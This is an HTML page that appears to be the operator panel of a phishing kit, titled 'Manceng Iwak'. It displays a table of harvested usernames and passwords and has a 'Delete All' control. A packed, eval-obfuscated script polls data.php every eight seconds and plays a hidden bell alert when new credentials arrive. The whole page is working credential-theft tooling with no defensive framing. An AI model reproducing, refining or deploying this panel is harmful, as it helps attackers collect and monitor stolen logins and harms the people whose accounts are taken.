<!DOCTYPE html>
<html lang="en">
<head>
<title>Manceng Iwak</title>
<meta http-equiv="Content-Type" content="text/html; charset=shift_jis"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<link href="//maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css" rel="stylesheet"/>
<script src="//code.jquery.com/jquery-3.1.1.min.js"></script>
</head>
<body style="padding-top:20px;">
<div class="container" style="width: 700px;">
	<div class="panel panel-default">
		<div class="panel-heading">
			<div class="group-btn text-right">
			<a href="code.txt" target="_blank"><button type="button" class="btn btn-info btn-xs"><b> Code</b></button></a>
			<a href="del.php"><button type="button" class='btn btn-danger btn-xs'><b> Delete All</b></button></a>
			</div>
		</div>
		<div class="panel-body">
            <table class="table table-striped table-hover table-bordered">
                <thead>
                    <tr>
                        <th>Username</th>
                        <th>Password</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                </tr>
             </thead>
          <tbody id="iyo"></tbody>
        </table>
      </div>
   </div>
</div>
<audio id="jaran" controls style="display: none;">
<source src="lib/bell_ring.aac" type="audio/aac">
<source src="lib/bell_ring.mp3" type="audio/mp3">
</audio>
<script type="text/javascript">
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('5 0=\'\';g(1(){$.e({d:"c",a:"4.2",b:"f",n:1(3){h(0&&3!==0){5 6=9.l(\'k\');6.i();$("#8").7("4.2")}0=3}})},m);$(9).j(1(){$("#8").7("4.2")});',24,24,'lastResponse|function|php|response|data|var|audio|load|iyo|document|url|dataType|GET|type|ajax|html|setInterval|if|play|ready|jaran|getElementById|8000|success'.split('|'),0,{}))
</script>
<style media="screen">
</script>
</body>
</html>